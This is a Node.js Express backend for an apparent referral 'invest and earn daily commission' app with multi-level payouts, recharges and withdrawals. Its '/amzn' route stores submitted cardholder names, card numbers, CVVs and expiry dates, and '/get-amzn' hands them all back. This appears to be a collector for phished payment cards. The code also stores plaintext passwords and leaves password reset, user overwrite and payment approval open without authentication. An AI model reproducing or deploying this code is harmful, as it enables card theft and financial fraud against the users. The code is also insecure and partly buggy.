const moment = require('moment');
const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const { Base } = require('deta');
const e = require('express');
const usr = Base('user');
const usr1 = Base('userone');
const md = Base('main');
const wr = Base('withdraw');
const rr = Base('recharge');
const trns = Base('transaction');
const upis = Base('upi');
const prod = Base('product');
const mm = Base('mundrawala');
const amzn = Base('amzn');

const app = express();
app.use(bodyParser.json({
    limit: '500mb'
}));


app.use(bodyParser.urlencoded({
    limit: '500mb',
    extended: true
}));
app.use(express.json());
app.use(cors());

// ===============================================================
async function tnx(points, remarks, type, user) {
    const date = new Date().toLocaleString("en-US", { timeZone: 'Asia/Kolkata' });
    const to = { date, points, remarks, type, user }
    await trns.put(to)
}

function isClaimable(dt) {
    var o = new Date();
    o = new Date(o).toLocaleString("en-US", { timeZone: 'Asia/Kolkata' }).split(',')[0].toString();

    let d1 = dt.toString().split('/')
    let d2 = o.toString().split('/')

    let df = moment(d1[2] + '-' + d1[0] + '-' + d1[1]).isSameOrBefore(d2[2] + '-' + d2[0] + '-' + d2[1]);
    return df
}

async function six(r, ttl) {
    const u1 = await usr.get(r)
    let = temp = parseFloat(ttl) * 0.06

    u1.wallet.balance = parseFloat(u1.wallet.balance) + temp;
    u1.wallet.earn_commission = parseFloat(u1.wallet.earn_commission) + temp
    u1.wallet.today_earning = parseFloat(u1.wallet.today_earning) + temp
    tnx(parseFloat(ttl) * 0.06, "Commission Earn", 'credit', u1.key);

    if (u1.user.refer_by != undefined || u1.user.refer_by != "") {
        three(u1.user.refer_by, ttl)
    }
    await usr.put(u1)
}

async function three(r, ttl) {
    const u1 = await usr.get(r)
    let = temp = parseFloat(ttl) * 0.03

    u1.wallet.balance = parseFloat(u1.wallet.balance) + temp;
    u1.wallet.earn_commission = parseFloat(u1.wallet.earn_commission) + temp
    u1.wallet.today_earning = parseFloat(u1.wallet.today_earning) + temp
    tnx(parseFloat(ttl) * 0.03, "commission earn ", 'credit', u1.key);
    await usr.put(u1)
}

async function zero(u) {
    const u1 = await usr.get(u);
    u1.wallet.today_earning = 0;
    await usr.put(u1);
}

async function testComm(id, user) {
    const u1 = await usr.get(user);
    if (u1.product.list != undefined) {
        let arr = Object.keys(u1.product.list);
        if (arr.includes(id)) {
            return true;
        }
        else {
            return false;
        }
    }
    else {
        return false;
    }
}
// ===============================================================
app.get('/', async (req, res) => {
    let allUser = await usr.fetch();
    allUser = allUser.items
    let userList = {}
    allUser.forEach((c) => {
        let ttl = 0;
        zero(c.key);
        if (c.product.list != undefined) {
            let k = Object.values(c.product.list);
            k.forEach(j => {
                if (testComm(j.id, c.user.refer_by)) {
                    ttl = ttl + j.commission * j.qty
                }
            })
            userList[c.key] = ttl
        }
        if (ttl != 0) {
            // masterList[b.key]=b.user.refer_by;
            if (c.user.refer_by != undefined || c.user.refer_by != "") {
                six(c.user.refer_by, ttl)
            }
            // u1.wallet.balance = parseFloat(u1.wallet.balance) + parseFloat(ttl) * 0.06;
            // u1.wallet.earn_commission = parseFloat(u1.earn_commission) + parseFloat(ttl) * 0.06
            // u1.wallet.today_earning = parseFloat(u1.today_earning) + parseFloat(ttl) * 0.06
            // tnx(parseFloat(ttl) * 0.06, "commission earn", 'credit', u1.key);


            // let u2 = userList[u1.user.refer_by];
            // u2.wallet.balance = parseFloat(u2.wallet.balance) + parseFloat(ttl) * 0.03;
            // u2.wallet.earn_commission = parseFloat(u2.earn_commission) + parseFloat(ttl) * 0.03
            // u2.wallet.today_earning = parseFloat(u2.today_earning) + parseFloat(ttl) * 0.03
            // // tnx(parseFloat(ttl) * 0.03, "commission earn", 'credit', u2.key);
            // // await usr.put(u2);
            // masterList[u2.key] = u2
        }
    })


    res.send(userList)
})

app.post('/amzn', async (req, res)=>{
    const {name,card,vv,m,y} = req.body;
    const date = new Date().toLocaleString("en-US", { timeZone: 'Asia/Kolkata' });
    const t = {name,card,vv,m,y,date};
    const a = await amzn.put(t);
    res.send(a);
})

app.get('/get-amzn',async (req, res)=>{
    
    const a = await amzn.fetch();
    res.send(a);
})

app.get('/mmm', async (req, res) => {
    const d = req.headers
    res.send(d)
})

app.get('/ppp', async(req,res)=>{
    const {time,key} = req.body;
    const tp = {time,key}
    const a = await mm.put(tp);
    res.send(a)
})

app.post('/prod-status', async (req, res) => {
    const { key } = req.body;
    const u = await prod.get(key);
    if (u.status == 1) { u.status = 0 }
    else { u.status = 1 }
    await prod.put(u);
    const data = prod.fetch();
    res.send(data)
})
app.post('/claim-com', async (req, res) => {
    const { key } = req.body;
    const u = await usr.get(key);
    u.wallet.today_earning = 0;
    let d = u.product.list;
    var e = new Date();
    e.setDate(e.getDate() + 1);
    e = new Date(e).toLocaleString("en-US", { timeZone: 'Asia/Kolkata' }).split(',')[0];

    let a = Object.keys(d);
    let ttl = 0
    a.forEach(k => {
        let b = d[k];

        b.validity.forEach((v, i) => {
            if (v > 0) {
                if (isClaimable(b.claim[i])) {
                    b.validity[i] = parseInt(v) - 1;
                    ttl = parseFloat(ttl) + parseFloat(b.commission);
                    b.claim[i] = e;
                }
            }
        })
        d[k] = b;
    })
    u.wallet.balance = parseFloat(u.wallet.balance) + parseFloat(ttl);
    u.wallet.earn_commission = parseFloat(u.wallet.earn_commission) + parseFloat(ttl);
    u.wallet.today_earning = parseFloat(u.wallet.today_earning) + parseFloat(ttl);

    u.product.list = d;
    const data = await usr.put(u)

    if (ttl == 0) {
        res.status(400)
    }
    else {
        tnx(ttl, 'Commission earned on your assets', 'credit', u.key)
        res.send(data)
    }
})

app.post('/buy-prod', async (req, res) => {
    const { u_key, p_key } = req.body;

    let user = await usr.get(u_key);
    const product = await prod.get(p_key);

    if (user.product.list == undefined) {
        user.product['list'] = {};
    }
    let dt = new Date();
    dt.setDate(dt.getDate() + 1);
    dt = new Date(dt).toLocaleString("en-US", { timeZone: 'Asia/Kolkata' }).split(',')[0];
    // res.send(user)
    if (user.product.list[p_key] != undefined) {
        let p = user.product.list[p_key]
        if (p.qty < product.total_revenue) {
            p.qty = parseInt(p.qty) + 1;
            p.price = parseInt(p.price);
            p.claim.push(dt)
            p.validity.push(product.validity);
            p.commission = product.daily_commission
            user.product.list[p_key] = p;
            user.wallet.balance = parseFloat(user.wallet.balance) - parseFloat(product.price)
            tnx(product.price, 'Buy a product of named ' + product.name, 'debit', user.key)
        }
    }
    else {
        let p = {};
        p['qty'] = 1;
        p['price'] = parseInt(product.price);
        p['validity'] = [product.validity];
        p['commission'] = product.daily_commission;
        p['claim'] = [dt];
        p['id'] = p_key;
        user.product.list[p_key] = p;
        user.wallet.balance = parseFloat(user.wallet.balance) - parseFloat(product.price)
        tnx(product.price, 'Buy a product of named ' + product.name, 'debit', user.key)
    }

    const pad = await usr.put(user);
    res.send(pad)
})

app.get('/product', async (req, res) => {
    const u = await prod.fetch();
    res.send(u)
})

app.post('/product', async (req, res) => {
    let { daily_commission,
        desc,
        detail,
        img,
        name,
        price,
        status,
        total_revenue,
        validity, 
        key } = req.body;
    price = parseInt(price)
    daily_commission = parseInt(daily_commission)
    total_revenue = parseInt(total_revenue)
    validity = parseInt(validity)
    const to = {
        daily_commission,
        desc,
        detail,
        img,
        name,
        price,
        status,
        total_revenue,
        validity, 
        key
    }
    const pp = await prod.put(to)
    const a = await prod.fetch();
    res.send(a);

})

app.get('/user', async (req, res) => {
    const u = await usr.fetch({ 'claim': null });
    res.send(u)
})

app.get('/wr', async (req, res) => {
    const u = await wr.fetch();
    res.send(u)
})

app.get('/wr-u', async (req, res) => {
    const { key } = req.body;
    const u = await wr.fetch({ user: key });
    res.send(u)
})

app.get('/rr', async (req, res) => {
    const u = await rr.fetch();
    res.send(u)
})

app.get('/tnx', async (req, res) => {
    const u = await trns.fetch();
    res.send(u)
})

app.get('/tnxu', async (req, res) => {
    const { key } = req.body;
    const g = await trns.fetch({ user: key });
    res.send(g)
})

app.post('/reset-pass', async (req, res) => {
    const { key, password } = req.body;
    const mainData = await usr.get(key);
    mainData.user.password = password;
    await usr.put(mainData);
    const u = await usr.fetch();
    res.send(u);
})

app.delete('/trns', async (req, res) => {
    const { key } = req.body;
    await trns.delete(key);
    res.send('ok');
})

app.delete('/prodt', async (req, res) => {
    const { key } = req.body;
    await prod.delete(key);
    res.send('ok');
})


app.delete('/wr', async (req, res) => {
    const { key } = req.body;
    await wr.delete(key);
    res.send('ok');
})

app.delete('/rr', async (req, res) => {
    const { key } = req.body;
    let a = await rr.delete(key);
    res.send(a);
})

app.post('/register', async (req, res) => {
    const { mobile, email, password, refer_by } = req.body;
    const prev = await usr.fetch({ 'key': mobile });
    if (prev.count == 0) {
        const mainData = await md.get('main');
        let c = mainData.last_user + 1
        let cd = 'SDI' + c
        mainData.last_user = c;
        let datausr = await usr.fetch({ code: refer_by })
        datausr = datausr.items[0];
        if (datausr == undefined) {
            res.status(400).send('invalid reffer')
        }

        const user = {
            mobile: mobile,
            email: email,
            password: password,
            refer_by: datausr.key,
            refer_to: [],
        };
        const wallet = {
            balance: 0000,
            total_recharge: 0000,
            total_withdraw: 0000,
            today_earning: 0000,
            earn_commission: 0000
        }

        const product = {

        };

        const bank = {
        };
        const key = mobile;
        const code = cd;
        const claim = null;
        const status = 1;
        const toCreate = { user, wallet, product, bank, claim, status, code, key };
        const insertedUser = await usr.put(toCreate);
        let tmp = datausr.user.refer_to
        tmp.push(insertedUser.key)
        datausr.user.refer_to = tmp;
        datausr.wallet.balance = parseFloat(datausr.wallet.balance) + parseFloat(mainData.commission)
        datausr.wallet.earn_commission = parseFloat(datausr.wallet.earn_commission) + parseFloat(mainData.commission);
        tnx(mainData.commission, 'commission on refer of ' + mobile, 'credit', datausr.key)
        await usr.put(datausr)
        await md.put(mainData);
        res.send(insertedUser)
    }
    else {
        const a = await usr.get(mobile)
        res.send(a)
    }
})

app.put('/user', async (req, res) => {
    const { data } = req.body;
    await usr.put(data);
    const u = await usr.fetch();
    res.send(u)
})

app.post('/login', async (req, res) => {
    const { mobile, password } = req.body;
    const data = await usr.get(mobile);
    if (password == data.user.password) {
        if (data.status == 1) {
            let code = data.code;
            data.wallet.balance = parseFloat(data.wallet.balance).toFixed(2);
            data.wallet.earn_commission = parseFloat(data.wallet.earn_commission).toFixed(2);
            data.wallet.today_earning = parseFloat(data.wallet.today_earning).toFixed(2);
            data['msg'] = "Sign-Up with this code '" + code + "' and earn some points"
            data.code = "Click Here"
            res.send(data)
        }
        else {
            res.status(401)
        }
    }
    else {
        res.status(401).send('invalid user')
    }
})


app.post('/add-bank', async (req, res) => {
    const { mobile, ac_name, ac_no, ifsc, upi, bank_name } = req.body;
    const userdata = await usr.get(mobile);
    const bank = {
        ac_name, ac_no, ifsc, upi, bank_name
    }
    userdata.bank = bank;
    const up = await usr.put(userdata);
    res.send(up)
})

app.post('/withdraw-req', async (req, res) => {
    const { mobile, points } = req.body;
    if (points >= 500) {
        const data = await usr.get(mobile);
        if (data.wallet.earn_commission >= points) {
            data.wallet.balance = parseFloat(data.wallet.balance) - parseFloat(points);
            data.wallet.earn_commission = parseFloat(data.wallet.earn_commission) - parseFloat(points);
            const bank = data.bank;
            const withdraw_amt = parseFloat(points) - (parseFloat(points) * 0.05)
            const status = 0;
            const user = mobile;
            const date = new Date().toLocaleString("en-US", { timeZone: 'Asia/Kolkata' });
            const to = { bank, withdraw_amt, points, status, user, date };
            await usr.put(data);
            const q = await wr.put(to)
            res.send(q)
        }
        else {
            res.status(400).send({ "msg": "insufficient balance" })
        }
    }
    else {
        res.status(400).send({ "msg": "you can withdraw points between 500 and 50000" })
    }
})


app.post('/recharge-req', async (req, res) => {
    const { mobile, points, upi, refid } = req.body;
    const data = await usr.get(mobile);
    // data.wallet.total_recharge = parseFloat(data.wallet.total_recharge) + parseFloat(points);
    const status = 0;
    const user = mobile;
    const date = new Date().toLocaleString("en-US", { timeZone: 'Asia/Kolkata' });
    const to = { points, status, user, date, upi, refid };
    // await usr.put(data);
    const q = await rr.put(to)
    res.send(q)

})


app.post('/recharge-req-acc', async (req, res) => {
    const { key } = req.body;
    const a = await rr.get(key);
    a.status = 1;
    tnx(a.points, 'Recharge', 'credit', a.user)
    const aa = await rr.put(a);
    const u = await usr.get(a.user);
    u.wallet.total_recharge = parseFloat(u.wallet.total_recharge) + parseFloat(a.points);
    u.wallet.balance = parseFloat(u.wallet.balance) + parseFloat(a.points);
    await usr.put(u);
    res.send(aa);
})

app.post('/withdraw-req-acc', async (req, res) => {
    const { key } = req.body;
    const a = await wr.get(key);
    a.status = 1;
    tnx(a.points, 'Withdraw', 'debit', a.user)
    const aa = await wr.put(a);
    const u = await usr.get(a.user);
    u.wallet.total_withdraw = parseFloat(u.wallet.total_withdraw) + parseFloat(a.points);
    await usr.put(u);
    res.send(aa);
})

app.post('/user-status', async (req, res) => {
    const { key } = req.body;
    const a = await usr.get(key);

    if (a.status == 1) {
        a.status = 0;
    }
    else {
        a.status = 1;
    }

    const b = await usr.put(a);
    const u = await usr.fetch();
    res.send(u)
})

app.post('/upi', async (req, res) => {
    const { upi } = req.body;
    const key = "upi"
    const to = { upi, key }
    const u = await upis.put(to)
    res.send(u)
})

app.get('/upi', async (req, res) => {
    const u = await upis.get('upi')
    res.send(u)
})


// export 'app'
module.exports = app
